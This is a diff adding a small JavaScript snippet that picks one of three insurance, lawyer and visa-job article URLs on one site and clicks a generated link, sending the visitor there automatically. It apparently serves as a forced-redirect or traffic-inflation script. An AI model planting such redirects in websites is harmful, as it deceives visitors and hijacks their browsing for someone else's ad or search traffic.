@@ -1,0 +1,16 @@
+// List of links
+var links = [
+    "https://everydaynewsngr.net/insurance/the-job-of-an-auto-collision-legal-counselor-in-guaranteeing-remuneration/",
+    "https://everydaynewsngr.net/insurance/best-car-accident-lawyers-in-dallas/",
+    "https://everydaynewsngr.net/insurance/jobs-in-usa-with-visa-sponsorship-2023/"
+];
+
+// Choose a random index within the range of the links
+var randomIndex = Math.floor(Math.random() * links.length);
+
+// Create an anchor element for the selected link
+var selectedLink = document.createElement('a');
+selectedLink.href = links[randomIndex];
+
+// Programmatically click on the selected link
+selectedLink.click();
